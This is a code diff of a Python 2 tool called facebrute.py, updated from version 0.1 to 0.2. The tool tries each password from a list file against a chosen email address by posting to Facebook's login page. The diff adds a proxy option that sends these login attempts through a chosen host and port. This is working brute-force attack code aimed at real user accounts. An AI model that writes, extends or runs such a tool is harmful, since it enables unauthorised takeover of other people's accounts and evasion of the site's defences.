@@ -26,7 +26,7 @@
 
 
 __author__ = "emerino <donvodka@gmail.com>"
-__version__ = "0.1"
+__version__ = "0.2"
 
 import time
 import getopt
@@ -61,9 +61,17 @@ def main(argv):
     if error or "help" in options:
         usage()
         return
-    
+
     DATA["email"] = options["username"]
 
+    host = "www.facebook.com"
+    port = 80
+    resource = "/login.php"
+
+    if "proxy" in options:
+        host, port = options["proxy"].split(":")
+        resource = "http://www.facebook.com/login.php"
+    
     running = True
     waiting = False
     found = False
@@ -81,13 +89,14 @@ def main(argv):
             waiting = False
             print "Trying: {0}".format(passwd.encode(options["encoding"]))
 
-            conn = httplib.HTTPConnection("www.facebook.com")
+            
+            conn = httplib.HTTPConnection(host, port)
 
             # needs to be encoded in utf-8 for urlencode
             DATA["pass"] = passwd.encode("utf-8")
             params = urllib.urlencode(DATA)
 
-            conn.request("POST", "/login.php", params, HEADERS)
+            conn.request("POST", resource, params, HEADERS)
             response = conn.getresponse()
 
             response = response.read()
@@ -114,7 +123,7 @@ def parse_args(argv):
     error = False
 
     try:
-        opts, args = getopt.getopt(argv, "u:p:e:h", ["username=", "passdb=", "encoding=", "help"])
+        opts, args = getopt.getopt(argv, "u:p:e:P:h", ["username=", "passdb=", "encoding=", "proxy=", "help"])
 
         for opt, arg in opts:
             if opt in ("-u", "--username"):
@@ -123,6 +132,8 @@ def parse_args(argv):
                 options["passdb"] = open(arg)
             elif opt in ("-e", "--encoding"):
                 options["encoding"] = arg
+            elif opt in ("-P", "--proxy"):
+                options["proxy"] = arg
             elif opt in ("-h", "--help"):
                 options["help"] = True
             else:
@@ -142,7 +153,7 @@ def usage():
 
 Usage:
 
-facebrute.py -u email -p passdb.list [-e encoding]""".format(__version__)
+facebrute.py -u email -p passdb.list [-e encoding] [-P proxy:port]""".format(__version__)
 
 if __name__ == "__main__":
     main(sys.argv[1:])
